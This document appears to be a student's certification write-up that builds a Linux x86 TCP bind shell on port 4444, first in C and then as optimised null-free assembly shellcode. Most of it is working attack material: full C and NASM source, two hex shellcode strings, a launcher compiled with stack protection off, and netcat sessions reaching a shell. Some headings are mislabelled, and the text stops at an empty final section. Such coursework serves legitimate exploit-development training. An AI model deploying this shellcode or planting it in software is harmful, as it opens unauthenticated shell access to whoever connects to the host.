# Note

This MD file has been created for the SecurityTube Linux Assembly Expert certification (https://www.pentesteracademy.com/course?id=3). Student ID: 14183.

# Exo 2 - Reverse shellcode - Part 1 - C Bind Shell

### *int main()*

For this first exercise lets start by developping a C bind shell. Steps are:

  * Create a socket
  * Bind the socket
  * Listen on a defined port
  * Accept connection
  * Redirect stdin/stdout/stderr
  *  Run /bin/sh

For each step, **man** is used in order to find usage description of functions.

### Socket

The first step is to create a socket which will be used to listen on.
```C
SYNOPSIS
        #include <sys/types.h>
        #include <sys/socket.h>
        int socket(int domain, int type, int protocol);

DESCRIPTION
        The domain argument specifies a communication domain; 
        AF_INET             IPv4 Internet protocols          ip(7)
 
        SOCK_STREAM     Provides sequenced, reliable, two-way, connection-based byte streams.  An out-of-band data transmission mechanism may be supported.
 
        The  protocol  specifies  a  particular  protocol  to  be used with the socket.  Normally only a single protocol exists to support a particular socket  type within a given protocol family, in which case protocol can be specified as 0. 
```

Our C code is:

```C
int my_socket = socket(AF_INET, SOCK_STREAM, 0);
```

### Bind
Then socket must be bind. 

```C
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```
  * *sockfd* is the socket we created, 
  * *addrlen* is len of *addr*
 addrlen specifies the size, in bytes, of the address structure pointed to by addr.
   * addr is a specific structure

The sockaddr structure myst contain:

  * the family: *AF_INET*
  * the address to listen: *INADDR_ANY*
  * the port to bind.

In order to format the port number, htons must be used:

```C
       The htons() function converts the unsigned short integer hostshort from host byte order to network byte order.
```

The bind part is:
```C
struct sockaddr_in my_sockaddr;
my_sockaddr.sin_family = AF_INET;
my_sockaddr.sin_addr.s_addr = INADDR_ANY;
my_sockaddr.sin_port = htons(4444);
bind(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));
```
### Listen

Lets start listening.

```C
SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int listen(int sockfd, int backlog);

DESCRIPTION
       The  backlog argument defines the maximum length to which the queue of pending connections for sockfd may grow.
```
C code is:

```C
listen(my_socket, 0);
```

### Accept

Then, connections must be accepted.

```C
SYNOPSIS
       #include <sys/types.h>           /* See NOTES */
       #include <sys/socket.h>

       int accept(int sockfd, struct sockaddr *adresse, socklen_t *longueur); 
```

C code:

```C
int my_accept = accept(my_socket, NULL, NULL);
```

### Redirect

Before executing our shell we need to redirect stdin, stdout and stderr to our socket. Again, lets use the man.

```C
#include <unistd.h>
int dup3(int oldfd, int newfd, int flags);
```

As a remember, file descriptor are (https://en.wikipedia.org/wiki/File_descriptor):

  * 0 for standard input (STDIN)
  * 1 for standard output (STDOUT)
  * 2 for standard error (STDERR)

Our code may be:

```C
dup2(my_accept, 0);
dup2(my_accept, 1);
dup2(my_accept, 2);
```

Regarding C code, using a for loop do not have a huge interest, but as its for shellcoding purposes, lets use a for loop:

```C
int i;
for(i = 0; i < 3; i++)
	dup2(my_accept, i);
```

### Execve

At last we can finnaly call execve:
```C
SYNOPSIS
       #include <unistd.h>

       int execve(const char *filename, char *const argv[],
                  char *const envp[]);
```

```C
execve("/bin/sh", NULL, NULL);
```
### Code

Lets try to compile it by removing the includes one by one in order to remove unecessary include. Finally there is a C Bind Shell:

```C
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

int main()
{
	int my_socket = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in my_sockaddr;
	my_sockaddr.sin_family = AF_INET;
    	my_sockaddr.sin_addr.s_addr = INADDR_ANY;
    	my_sockaddr.sin_port = htons(4444);
	bind(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));

	listen(my_socket, 0);

	int my_accept = accept(my_socket, NULL, NULL);

	int i;
	for(i = 0; i < 3; i++)
		dup2(my_accept, i);

	execve("/bin/sh", NULL, NULL);

	return 0;
}
```

### Usage

In a first terminal:

```
cervoise@slae:~/exam/bind$ gcc bind_shell.c -o bind_shell cervoise@slae:~/exam/bind$ ./bind_shell
```

In another terminal:
```
cervoise@slae:~/slae/Shellcode$ netstat -laput |grep bind_shell
[...]
tcp        0      0 *:4444                  *:*                     LISTEN      21884/bind_shell   
[...]
cervoise@slae:~/slae/Shellcode$ nc 127.0.0.1 4444
id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
exit
cervoise@slae:~/slae/Shellcode$ nc 127.0.0.1 4454
$ id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ exit
```
# Exo 2 - Reverse shellcode - Part 2 - Bind Shellcode

### Socket

There is no syscall for socket. But one exist for socketcall which allows to call socket functions.

```
$ grep socket /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_socketcall		102
```

```C
SYNOPSIS
       int socketcall(int call, unsigned long *args);

DESCRIPTION
       socketcall()  is  a  common kernel entry point for the socket system calls.  call determines which socket function to invoke.  args points to a block containing the actual arguments, which are
       passed through to the appropriate call.

       SYS_SOCKET        socket(2)
```

In order to call socket:

- EAX will contain 102
- EBX will contain SYS_SOCKET
- EXC will contain the args : (AF_INET, SOCK_STREAM, 0)

Lets gets hex values of all these variables:

```
$ python3 -c "print(hex(102))"
0x66
$ for elmt in $(locate net.h); do grep SYS_SOCKET $elmt; done
#define SYS_SOCKET	1		/* sys_socket(2)		*/
$ for elmt in $(locate socket.h); do grep AF_INET $elmt; done
#define	AF_INET		PF_INET
$ for elmt in $(locate socket.h); do grep PF_INET $elmt; done
#define	PF_INET		2	/* IP protocol family.  */
$ for elmt in $(locate net.h); do grep SOCK_STREAM $elmt; done
 * @SOCK_STREAM: stream (connection) socket
	SOCK_STREAM	= 1,
```

Our registers will be:

- EAX will contain 0x66
- EBX will contain 0x1
- ECX will contain the args : (0x2, 0x1, 0x0)

For the two first register, ASM is easy:
```ASM
xor eax, eax
mov al, 0x66
xor ebx, ebx
mov bl, 1
```
	
In order to pass the args in ECX we can push them on the stack. The key point is to remember that the stack is a LIFO structure.
```ASM
xor ecx, ecx
push ecx
push 1
push 2
mov ecx, esp
```

EAX will now contain a reference to the socket, lets put it in EDI.
```ASM
mov edi, eax
```
### Bind

Next step is to bind the socket. Again, socketcall is used.
```
$ for elmt in $(locate net.h); do grep SYS_BIND $elmt; done
#define SYS_BIND	2		/* sys_bind(2)			*/
```

- EAX will contain 0x66
- EBX will contain 0x2
- ECX will contain *my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr);*

As we have two structures (ECX and my_sockaddr), my_sockaddr needs to be pushed on the stack, saved in a register and then *bind* arguments must be pushed on the stack and put in ECX.

Lets get the value of *my_sockaddr* structure.

```
$ python3 -c "print(hex(4444))"
0x115c
```

We turn the value into little indian: *0x5c11*.

```
$ for elmt in $(locate in.h); do grep INADDR_ANY $elmt; done
#define	INADDR_ANY		((unsigned long int) 0x00000000)
```
For the first structure, values must be pushed on the stack:

- 0
- 0x5c11
- 0x2

Size of the structure is 16 (0x10. As EAX is 8 bytes 0x5c11 and 0x2 must be pushed as word in order to have a structure of size 16.

```ASM
xor eax, eax
push eax
push word 0x5c11	
push word 0x2
mov edx, esp

mov al, 0x66
mov bl, 2 
push 0x10
push edx
push edi
mov ecx, esp

int 0x80
```

### Listen

Then we have to listen for the socket, we will use socketcall with *SYS_LISTEN*.

```
$ for elmt in $(locate net.h); do grep SYS_LISTEN $elmt; done
#define SYS_LISTEN	4		/* sys_listen(2)		*/
```

- EAX will contain 0x66
- EBX will contain 0x4
- ECX will contain (created_socket, 0)

```ASM
mov al, 0x66
mov bl, 4
xor ecx, ecx
push ecx
push edi
mov ecx, esp
int 0x80
```

### Accept
The syscall number is checked.
```
$ for elmt in $(locate net.h); do grep SYS_ACCEPT $elmt; done
#define SYS_ACCEPT	5		/* sys_accept(2)		*/
```

NULL is 0.

- EAX will contain 0x66
- EBX will contain 0x5
- ECX will contain (my_socket, 0, 0)
```ASM
mov al, 0x66
mov bl, 5
xor ecx, ecx
push ecx
push ecx
push edi
mov ecx, esp
int 0x80
```

As the result will be used on the next syscall (by EBX), lets put the result in EBX.

```ASM
mov ebx, eax
```
### Dup
The syscall number is checked and converted in hexadecimal.
```
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h |grep dup2
#define __NR_dup2		 63
$ python3 -c "print(hex(63))"
0x3f
```

- EAX will contain 0x3F
- EBX will contain EDI
- ECX will contain 0/1/2

```ASM
xor eax, eax
mov al, 0x3F 
xor ecx,ecx
int 0x80

xor eax, eax
mov al, 0x3F 
mov cl, 1
int 0x80

xor eax, eax
mov al, 0x3F 
mov cl, 2
int 0x80
```

This can be easily reduce using a loop:
```ASM
;dup2 for loop
	xor ecx, ecx
	mov cl, 2

duploop:
	xor eax, eax
	mov al, 0x3f	
	int 0x80
	dec ecx
	jns duploop

```


### Execve
The syscall number is checked.

```
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h |grep execve
#define __NR_execve		 11
```

In order to call execve, a JMP CALL POP is needed.

```ASM
jmp callexecve

execve:
	mov al, 0xb
	pop ebx
	xor ecx, ecx
	xor edx, edx
	int 0x80

callexecve:
	call shellcode
	db "Hello World!", 0xA
```

### Exit gracefully
This code is from the course. It must be inserted after execve execution but before *callexecve*.

```ASM
xor eax, eax
mov al, 1
int 0x80
```

### Final code

```ASM
global _start

section .text

_start:
	; socketcall
	xor eax, eax
	mov al, 0x66
	xor ebx, ebx
	mov bl, 1

	xor ecx, ecx
	push ecx
	push 0x1
	push 0x2
	mov ecx, esp
	int 0x80

	mov edi, eax

	;bind
	xor eax, eax
	push eax
	push word 0x5c11	
	push word 0x2
	mov edx, esp

	mov al, 0x66
	mov bl, 2 
	push 0x10
	push edx
	push edi
	mov ecx, esp

	int 0x80

	;listen
	xor eax, eax
	mov al, 0x66
	mov bl, 4
	push eax
	push edi
	mov ecx, esp
	int 0x80

	;accept
	mov al, 0x66
	mov bl, 5
	xor ecx, ecx
	push ecx
	push ecx
	push edi
	mov ecx, esp
	int 0x80

	mov ebx, eax
	
	;dup2 for loop
	xor ecx, ecx
	mov cl, 2

duploop:
	xor eax, eax
	mov al, 0x3f	
	int 0x80
	dec ecx
	jns duploop	

	;execve
	jmp callexecve

;used for execve
execve:
	mov al, 0xb
	pop ebx
	xor ecx, ecx
	xor edx, edx
	int 0x80

	;exit
	xor eax, eax
	mov al, 1
	int 0x80

callexecve:
	call execve
	db "/bin/sh"
```

### Compilation

Compilation is done using *nasm*:
```
$ nasm -f elf32 -o bind_shellcode.o bind_shellcode.nasm
```

In order to convert the ASM content to a hexadecimal shellcode a small script is used:

```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    echo "Usage: $0 yourProgram"
    exit 2
fi

if [ -f "$1" ]; then
    #From https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump
    objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
else 
    echo "$1 does not exist"
fi
```

### Execution

Our C shellcode launcher file is:
```C
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x50\x66\x68\x11\x5c\x66\x6a\x02\x89\xe2\xb0\x66\xb3\x02\x6a\x10\x52\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\xb3\x04\x50\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7\xeb\x0f\xb0\x0b\x5b\x31\xc9\x31\xd2\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

main() {
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

Compilation and execution in a first terminal:
```
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode 
Shellcode Length:  114
```

And access to the bind shell in antoher terminal:
```
$ netstat -laput |grep shellcode
[...]
tcp        0      0 *:4444                  *:*                     LISTEN      22416/shellcode 
$ nc 127.0.0.1 4444
id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
exit

```

The shellcode size is 114, next step is to reduce it!

# Exo 1 - Bind shellcode - Part 3 - Optimized Bind Shellcode


In this part optimization is done to reduce the shellcode length. Only successfull tries are reported here.

### Socket call

EBX is set to 0x1 (because of previous *mov bl, 1*), lets see if *push ebx* is shorter than *push 0x1*

```
8048060:	6a 01                	push   0x1
8048062:	53                   	push   ebx
```

### Bind

In the bind part there is a *mov bl, 0x2*. As EBX is already set to 0x1, lets see if inc is shorted:

```
8048060:	b3 02                	mov    bl,0x2
8048062:	43                   	inc    ebx
```
 
Before this section, 0x2 is pushed. As *push bx* is shorter than *pushw 0x2*, we can put the inc ebx at the beginning of this part and *push bx*

```
8048060:	66 6a 02             	pushw  0x2
8048063:	66 53                	push   bx
```

This code
```ASM
xor eax, eax
push eax
push word 0x5c11	
push word 0x2
mov edx, esp

mov al, 0x66
mov bl, 2 
push 0x10
push edx
push edi
mov ecx, esp

int 0x80
```

Became
```ASM
xor eax, eax
push eax
push word 0x5c11
inc bl	
push word bx
mov edx, esp

mov al, 0x66
push 0x10
push edx
push edi
mov ecx, esp

int 0x80
```
 
### Accept

Again, we put 0x5 in bl but bl is already set to 0x4. Inc is shorted

``` 
8048060:	b3 05                	mov    bl,0x5
8048062:	43                   	inc    ebx
```

At the end of the accept part, EAX is put in EBX. Few instructions later EAX is set to 0 because value in EAX cannot be predicted, and then AL is set to 0x3F.

Lets check if we can exchange value (*xchg* instruction) between EAX and EBX. As EBX value is known, EAX will not need to be set to 0 before to put 0x3F in AL

```  
8048060:	89 c3                	mov    ebx,eax
8048062:	31 c0                	xor    eax,eax
8048064:	93                   	xchg   ebx,eax
```

### Excevec

Because of the loop, ecx is set to -1. Lets check if *inc ecx* is not shorter than *xor ecx,ecx*

```
8048060:	31 c9                	xor    ecx,ecx
8048062:	41                   	inc    ecx
```

Lets check if it is not possible to put the PATH of the executed program on the stack directly in order to reduce the size of the shellcode.

Original code:

```
00000000 <execve-0x2>:
   0:	eb 0f                	jmp    11 <callexecve>

00000002 <execve>:
   2:	b0 0b                	mov    al,0xb
   4:	5b                   	pop    ebx
   5:	31 c9                	xor    ecx,ecx
   7:	31 d2                	xor    edx,edx
   9:	cd 80                	int    0x80
   b:	31 c0                	xor    eax,eax
   d:	b0 01                	mov    al,0x1
   f:	cd 80                	int    0x80

00000011 <callexecve>:
  11:	e8 ec ff ff ff       	call   2 <execve>
  16:	2f                   	das    
  17:	62 69 6e             	bound  ebp,QWORD PTR [ecx+0x6e]
  1a:	2f                   	das    
  1b:	73 68                	jae    85 <callexecve+0x74>
```

Lentgth is 28.

Now, lets try to put "/bin/sh" on the stack. As null byte must be avoid, the PATH is padded using "/". Here "/bin/sh" became "//bin/sh"

```
   0:	b0 0b                	mov    al,0xb
   2:	31 c9                	xor    ecx,ecx
   4:	51                   	push   ecx
   5:	68 6e 2f 73 68       	push   0x68732f6e ; "hs/n"
   a:	68 2f 2f 62 69       	push   0x69622f2f ; "ib//"
   f:	89 e3                	mov    ebx,esp
  11:	31 d2                	xor    edx,edx
  13:	cd 80                	int    0x80
```

Length is 21 (with 1 byte for padding). The maximum will be 3 bytes of padding. Using this method redecue the length between 5 and 8 bytes.

### Exit

Last improvement, the exit can be removed:

```
 8048060:	31 c0                	xor    eax,eax
 8048062:	b0 01                	mov    al,0x1
 8048064:	cd 80                	int    0x80
```

### Optimized shellcode

```ASM
global _start

section .text

_start:
	; socketcall
	xor eax, eax
	mov al, 0x66
	xor ebx, ebx
	mov bl, 1

	xor ecx, ecx
	push ecx
	push ebx
	push 0x2
	mov ecx, esp
	int 0x80

	mov edi, eax

	;bind
	xor eax, eax
	push eax
	push word 0x5c11
	inc bl	
	push word bx
	mov edx, esp

	mov al, 0x66
	push 0x10
	push edx
	push edi
	mov ecx, esp

	int 0x80

	;listen
	xor eax, eax
	mov al, 0x66
	mov bl, 4
	push eax
	push edi
	mov ecx, esp
	int 0x80

	;accept
	mov al, 0x66
	inc ebx
	xor ecx, ecx
	push ecx
	push ecx
	push edi
	mov ecx, esp
	int 0x80

	xchg   ebx,eax
	
	;dup2 for loop
	xor ecx, ecx
	mov cl, 2

duploop:
	mov al, 0x3f	
	int 0x80
	dec ecx
	jns duploop	

	;execve
	mov al, 0xb
	xor ecx, ecx
	push ecx,
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	xor edx, edx
	int 0x80
```

### Compilation

Compilation is done using *nasm*:
```
$ nasm -f elf32 -o bind_shellcode_lite.o bind_shellcode_lite.nasm
$ get-shellcode.sh bind_shellcode_lite.o
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x50\x66\x68\x11\x5c\xfe\xc3\x66\x53\x89\xe2\xb0\x66\x6a\x10\x52\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\xb3\x04\x50\x57\x89\xe1\xcd\x80\xb0\x66\x43\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xd2\xcd\x80"
```

### Execution

Our C shellcode launcher file is:
```C
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x50\x66\x68\x11\x5c\xfe\xc3\x66\x53\x89\xe2\xb0\x66\x6a\x10\x52\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\xb3\x04\x50\x57\x89\xe1\xcd\x80\xb0\x66\x43\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xd2\xcd\x80";

main() {
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

Compilation and execution in a first terminal:
```
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode 
Shellcode Length:  100
```

And access to the bind shell in antoher terminal:
```
$ netstat -laput |grep shellcode
[...]
tcp        0      0 *:4444                  *:*                     LISTEN      26682/shellcode 
$ nc 127.0.0.1 4444
id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
exit
```
Shellcode length was reduced of 14 bytes.

# Exo 1 - Bind shellcode - Part 4 - Bind Shellcode Generator
